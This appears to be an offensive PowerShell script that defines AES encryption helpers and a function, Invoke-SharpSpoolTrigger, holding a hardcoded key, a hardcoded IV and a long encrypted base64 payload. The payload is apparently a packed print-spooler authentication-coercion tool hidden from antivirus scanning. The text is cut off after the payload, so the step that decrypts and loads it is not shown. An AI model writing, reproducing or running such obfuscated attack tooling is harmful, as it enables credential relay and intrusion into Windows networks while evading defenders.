function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 128
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    return $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    return [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-Bytes($key, $IV, $data) {
    $bytes = $data
    $aesManaged = Create-AesManagedObject $key $IV
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $encData = $encryptedData
    $aesManaged.Dispose()
    return $encData
}

function Decrypt-Bytes($key, $IV, $enc_data) {
    $bytes = $enc_data
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    [byte[]] $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    $aesManaged.Dispose()
    
    return $unencryptedData
}
function Invoke-SharpSpoolTrigger
{

    $key = [System.Text.Encoding]::ASCII.GetBytes("dfmhrFACFMytZEaY")
    $key = [System.Convert]::ToBase64String($key)
    $iv = [System.Text.Encoding]::ASCII.GetBytes("EwEaqkGukpZmwqLA")
    $iv = [System.Convert]::ToBase64String($iv)

    $y = "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